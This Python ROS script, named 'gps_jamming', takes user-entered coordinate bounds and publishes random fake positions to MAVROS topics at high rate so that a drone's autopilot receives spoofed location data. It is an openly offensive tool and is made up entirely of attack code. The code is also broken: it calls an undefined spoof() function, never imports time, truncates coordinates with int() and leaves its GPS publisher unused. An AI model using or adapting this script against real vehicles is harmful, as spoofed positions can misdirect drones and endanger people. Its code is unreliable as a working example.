#!/usr/bin/env python3
import rospy
from sensor_msgs.msg import NavSatFix
from nav_msgs.msg import Odometry
import random

gps = NavSatFix()
local = Odometry()

gps_pub = rospy.Publisher('/mavros/global_position/global', NavSatFix, queue_size = 10)
local_pub = rospy.Publisher('/mavros/global_position/local', Odometry, queue_size = 10)
rospy.init_node('gps_jamming')
rate = rospy.Rate(1000)

print("Lower Limit")
X1 = input("Please enter the latitude: ")
Y1 = input("Please enter the longitude: ")

print("Upper Limit")
X2 = input("Please enter the latitude: ")
Y2 = input("Please enter the longitude: ")
print("Execution of the GPS jamming is active. ")

X = random.uniform(int(X1),int(X2))
Y = random.uniform(int(Y1),int(Y2))
n = 0
def jam():
    global X, Y, n

    if n == 0:
        X = random.uniform(int(X1),int(X2))
        Y = random.uniform(int(Y1),int(Y2))
        time.sleep(2)
    n = n + 1

    local.pose.pose.position.x = X
    local.pose.pose.position.y = Y
    local_pub.publish(local)

    if n == 100:
        n = 0

first = True
try:
    while not rospy.is_shutdown():
        if first:
            print("GPS is spoofed")
            first = False
        spoof()
        rate.sleep()
except KeyboardInterrupt:
    pass
    print("\Spoofing of the GPS has stopped.")